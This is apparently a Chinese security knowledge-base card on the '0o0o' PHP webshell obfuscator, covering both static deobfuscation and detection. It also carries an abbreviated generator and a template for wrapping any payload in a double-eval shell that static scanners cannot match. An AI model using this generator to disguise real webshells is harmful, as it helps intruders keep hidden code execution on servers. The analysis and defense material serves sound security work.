---
id: web-php-rce-webshell-0o0o-nested-obfuscator-random-alphabet
title: 0o0o 嵌套混淆生成器：随机双字母表 strtr 前置密钥 + urldecode 字母表拼装变量函数，双层 eval 隐藏 sink 名
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-0o0o-nested-random-alphabet-obfuscator
aliases:
- 0o0o 混淆
- webshell 嵌套混淆生成器
- 随机字母表 strtr 密钥前置
- urldecode 字符表拼函数名
- PHP 免杀生成器
tags:
- php
- webshell
- obfuscation
- strtr
- base64
- urldecode
- eval
- payload-generation
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-4
  verified_at: '2026-11-08T01:59:33+08:00'
  notes: 已对照原文核对（含全部4张图）：urldecode 字符表解码实测为 42 字符、拼出 base64_decode/strtr/substr 与分段长度 52，卡片已按实测数值勘正；生成侧 strtr 双随机字母表前置密文、前置 104 字符切表还原、Python translate 还原步骤与原文一致；免杀结论按原文截图（D盾 1 级可疑）降为 medium 置信度；未验证点：未实际执行混淆器与样本，免杀/查杀结果未复现。
---

## 一句话结论

一类被称为 0o0o 的 webshell 混淆器会把待保护载荷 base64 后用两张随机打乱的字母表做 `strtr` 置换，并把这两张字母表（各 52 字符）**前置拼在密文头部**；运行时先 `urldecode` 出一张 42 字符的字符表，用下标拼出 `base64_decode`、`strtr`、`substr` 这类函数名与 `52` 这个分段长度，再把头部 104 字符切成 from/to 两张表交给 `strtr` 还原数据并二次 `eval` —— 于是源码里既看不到明文载荷，也看不到 `eval($_POST...)` 这种可匹配的 sink 形态。

## 原理

- **密钥藏在密文里**：`$c = $T_k1 . $T_k2 . $c0`，其中 `$T_k1`/`$T_k2` 是 `str_shuffle("ABC...xyz")` 生成的两串 52 字符随机字母表，`$c0 = strtr(base64_encode(载荷), $T_k1, $T_k2)`。运行期的解码函数先取前 52 字符与次 52 字符做 `strtr` 的 from/to，把剩余部分还原成合法 base64，再 `base64_decode`。密钥不需要外传，与数据同体，这也是它能"一个文件自包含"的原因。
- **函数名由下标拼装**：`$O00OO0 = urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A")` 解出一张 42 字符表，随后用 `$O00OO0{3} . $O00OO0{6} . $O00OO0{33} . $O00OO0{30}` 之类下标拼出 `base64_decode`（`base` + 追加的 `64_decode`）、`strtr`、`substr` 的函数名，以及 `52` 这个分段长度。`eval` 本身是文件里仅存的明文关键字，静态扫描看不到的是载荷与函数名，只有运行时才拼出来。
- **双层 eval 结构**：外层 `eval($decode($blob))` 解出"第二层混淆代码"，第二层再 `eval('?>' . $decode(...))` 把真正的载荷执行。两次 `eval` 之间隔着一次动态函数调用，任何"eval 后紧跟括号字面量"的规则都对不上。
- **生成器是同一套逻辑的反向**：混淆器读入明文 PHP，`php_strip_whitespace` 精简、`base64_encode`、`strtr` 置换、把两张字母表前置，然后用字符串模板拼出完整的 0o0o 外壳写成新文件。因为模板里全是 `$O00O0O`、`$O0O000` 这类随机变量名，产出文件天然无固定特征。
- **免杀的机理与边界**：这类壳只提高静态匹配成本（关键字不可见、字符串不可读、变量名随机），不改变运行时行为；一旦 RASP 挂钩 `eval` 或流量层看请求参数，仍能识别。原文正文称"经测试能够过 D 盾和火绒杀毒"，但同篇截图里的查杀结果显示 D 盾把它报为「1 级 可疑合并 `$v{}.$v{}`」——即"低级别可疑"而非"通过"，因此本卡的免杀效果按 medium 置信度记录，不应视为已验证的免杀结论。
- **还原思路**：因为变换全部确定性且密钥内嵌，静态即可还原（取前 104 字符切表、`strtr` 还原、`base64_decode`），不需要执行样本。

## 触发条件

- 拿到可疑 PHP 文件，形态为：`urldecode` 一张字符表 + 一串 `$X{n}` 下标拼接 + 单个超长 base64 常量 + 双层 `eval`。
- 混淆器参数（字母表长度 52、字符表内容）都内嵌在文件里，无外部密钥。
- 需要产出同类混淆载荷（红队构造）或需要还原样本（蓝队分析）。

## 利用步骤

1. 识别结构：`urldecode("%6E1%7A...")` 形式的字符表、`$var{数字}` 下标拼接、`eval($f("..."))` 外壳、以及第二层 `eval('?>' . ...)`。
2. 还原字符表：把 `urldecode` 的参数解码，得到 42 字符表；用它按源码下标顺序拼出各 `$O00O0O`/`$O0OO00`/`$OO0O00`/`$OO0000` 的实际值（就是 `base64_decode`、`strtr`、`substr` 与分段长度 `52`）。
3. 取密文：找到 `$O0O000 = "<长 base64>"`（第二层里可能叫别的变量名），以及 `$OO0000`（分段长度，本例解出为 52）。
4. 切表还原：`c = blob[:52]`、`b = blob[52:104]`、`a = blob[104:]`；`mapped = a.translate(maketrans(b, c))`；`base64_decode(mapped)` 得到第二层明文。
5. 剥第二层：对新明文重复第 1-4 步（把 `eval` 换 `echo` 或直接静态复现），直到出现 `<?php` 与真正的 sink（`$_POST`/`system`/`assert`）。
6. 构造侧：用同样的模板（随机双字母表 + 前置密钥 + 下标拼装的函数名）把任意载荷包进去并写出新文件；注意不要在生产环境执行。

## PoC

混淆器核心（原文生成逻辑的精简形态）：

```php
<?php
function RandAbc(){ return str_shuffle("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"); }

$filename = 'phpinfo.php';            // 待混淆的明文载荷
$T_k1 = RandAbc();                    // 原始字母表
$T_k2 = RandAbc();                    // 替换字母表

$v1 = base64_encode(file_get_contents($filename));
$c  = strtr($v1, $T_k1, $T_k2);       // 一一置换
$c  = $T_k1 . $T_k2 . $c;             // 两张字母表前置到密文头部

$q1="O00O0O"; $q2="O0O000"; $q3="O0OO00"; $q4="OO0O00"; $q5="OO0000"; $q6="O00OO0";
$s='$'.$q6.'=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");'
  .'$'.$q1.'=$'.$q6.'{3}.$'.$q6.'{6}.$'.$q6.'{33}.$'.$q6.'{30};'
  // ... 继续用下标拼出 strtr/substr/base64_decode ...
  .'eval($'.$q1.'("'.base64_encode('$'.$q2.'="'.$c.'";eval(\'?>\'.$'
  .$q1.'('.$q3.'(...)));').'"));';
$s = '<?php' . "\n" . $s . "\n?>";
file_put_contents('temp'.$filename, $s);
```

产出的外壳形态（第二层片段）：

```php
<?php
$O00OO0 = urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
$O00O0O = $O00OO0{3} . $O00OO0{6} . $O00OO0{33} . $O00OO0{30};
// ... 省略若干下标拼接 ...
$O0O000 = "SEBoWxTbvHhQNqjynIRMcmlAKYkZufVJUCieaLdsrtgwFXDzpGOPWLcskezqRrAUKBShPDGYMFNOnEbjtwZpaVQdHygCIvxTJfXuoiml77t/lX9THrOKVFZSHi8xMiATHk5FqhxomT0nlu4=";
echo htmlspecialchars('?>' . $O00O0O($O0OO00($OO0O00($O0O000, $OO0000 * 2), $OO0O00($O0O000, $OO0000, $OO0000), $OO0O00($O0O000, 0, $OO0000))));
?>
```

静态还原（Python，不执行样本）：

```python
import base64
blob = "SEBoWxTbvHhQ..."          # $O0O000 的值
n = 52                             # $OO0000 解出的分段长度
c, b, a = blob[:n], blob[n:2*n], blob[2*n:]
plain = base64.b64decode(a.translate(str.maketrans(b, c)))
print(plain.decode("utf-8", "replace"))
```

## 变体与关联

- 变体：字母表改成数字/符号混合集、或改成三段（前中后各一段），本质仍是"密钥前置 + 同长度置换"。
- 变体：函数名拼装可换成数组下标、`strrev`、`chr()` 相加；`eval` 可换成 `assert`/`create_function`。
- 关联：[[code-analysis-reverse-obfuscation-php-gzinflate-strtr-base64-unwrap]]（同族壳的**分析侧**通用卡：gzinflate/strtr/base64 逐层还原，含口令门与驻留后门的审读要点，本卡的还原步骤与其一致，差异在本卡补充了**生成侧**模板与"密钥前置 + 下标拼函数名"的构造方式）、[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]（同目的：让函数名/调用形态静态不可见）、[[web-php-rce-webshell-business-data-carrier-obfuscation]]（把载荷藏进业务数据结构而非编码层）。
- 边界：若混淆器改成带外部密钥（AES/RSA）或运行期派生密钥，静态还原失效；AV/D 盾这类基于特征与熵的引擎是否放行取决于样本与规则库版本，不应把单次结果当作普遍结论。

## 检测与防御

- 静态检测：`urldecode("%..%..")` 长串 + `$变量{数字}` 连续拼接 + 单个 >200 字符的 base64 常量 + `eval($变量("<base64>"))` 组合；文件熵高、无正常业务结构。
- 动态检测：RASP 挂钩 `eval`，记录参数字符串与调用栈；若 `eval` 的参数在运行期才由 `base64_decode(strtr(...))` 生成，即为强特征。
- 加固：Web 目录只读 + 文件完整性监控；`disable_functions` 收紧（`assert`/`create_function` 等）；不要依赖"过了某款查杀"作为安全结论。
- 应急：保存样本哈希，按本卡步骤静态还原出明文后再判断回连地址、口令门与写文件路径，不在业务环境执行样本。
